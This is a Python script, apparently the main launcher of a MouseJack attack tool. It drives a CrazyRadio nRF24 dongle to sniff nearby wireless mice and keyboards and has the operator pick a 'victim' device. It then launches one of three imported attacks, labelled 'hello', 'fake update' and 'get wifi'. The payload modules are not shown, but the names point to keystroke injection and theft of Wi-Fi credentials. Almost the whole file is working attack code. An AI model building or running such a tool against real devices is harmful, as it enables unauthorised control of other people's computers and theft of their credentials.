from tools import Scanner, attacker
from lib import nrf24, nrf24_reset
import time
import os


def ping_channel(radio, channels):
    ping = [0x0f, 0x0f, 0x0f, 0x0f]
    for channel in channels:
        radio.set_channel(channel)
        if radio.transmit_payload(ping):
            break



class mouseJack:

    if __name__ == '__main__':
        os.system("clear")
        print()
        print()
        print('          ##############################################################\n'
              '          #                                                            #\n'
              '          #                     MOUSEJACK ATTACK                       #\n'
              '          #                                                            #\n'
              '          ####### please make sure that crazyRadio is connected  #######\n')

        # init the dongle and reset it
        while 1:
            try:
                nrf24_reset.reset_radio(0)
                from attacks import FakeUpdate_attack, wifi_attack, hello_attack
                radio = nrf24.nrf24(0)
                break
            except Exception:
                continue
        os.system("clear")
        print()
        print()
        print('          ##############################################################\n'
              '          #                                                            #\n'
              '          #                     MOUSEJACK ATTACK                       #\n'
              '          #                                                            #\n'
              '          #################### crazyRadio is ready #####################\n')
        # print("crazyRadio is ready..")
        print()
        radio.enter_promiscuous_mode()
        radio.enable_lna()
        channels = range(2, 84)
        os.system("clear")
        print()
        print()
        print('          ##############################################################\n'
              '          #                                                            #\n'
              '          #                     MOUSEJACK ATTACK                       #\n'
              '          #                                                            #\n'
              '          ############### Scanning for available devices ##############\n')
        devices_list = Scanner.scan(radio, channels,  int(input("choose time for scanning: ")))
        os.system("clear")
        print()
        print()
        print('          ##############################################################\n'
              '          #                                                            #\n'
              '          #                     MOUSEJACK ATTACK                       #\n'
              '          #                                                            #\n'
              '          ##################### available devices ######################\n')
        print()
        print()
        for key, val in devices_list.items():
            print(key, ":", val[0], "(", val[1], ")")
        print("choose victim device key from( 0 - ", len(devices_list.items()) - 1, "): ")
        victim_key = int(input())
        print()
        print()
        victim = devices_list[victim_key]
        os.system("clear")
        print()
        print()
        print('          ##############################################################\n'
              '          #                                                            #\n'
              '          #                     MOUSEJACK ATTACK                       #\n'
              '          #                                                            #\n'
              '          ##################### available attacks ######################\n')
        print()
        print()
        print("1) hello attack")
        print("2) fake update attack")
        print("3) get wifi attack")
        attack_key = int(input("choose attack key: "))
        os.system("clear")
        print()
        print()
        print('          ##############################################################\n'
              '          #                                                            #\n'
              '          #                     MOUSEJACK ATTACK                       #\n'
              '          #                        please wait                         #\n'
              '          ####################### Attack Started #######################\n')
        print()
        print()
        radio.enter_sniffer_mode(victim[0])
        ping_channel(radio, channels)
        if attack_key == 1:
            hello_attack = hello_attack.hello_attack(victim[0], radio)
            hello_attack.run()
        elif attack_key == 2:
            FakeUpdate_attack = FakeUpdate_attack.FakeUpdate_attack(victim[0], radio)
            FakeUpdate_attack.run()
        elif attack_key == 3:
            wifi_attack = wifi_attack.wifi_attack(victim[0], radio)
            wifi_attack.run()
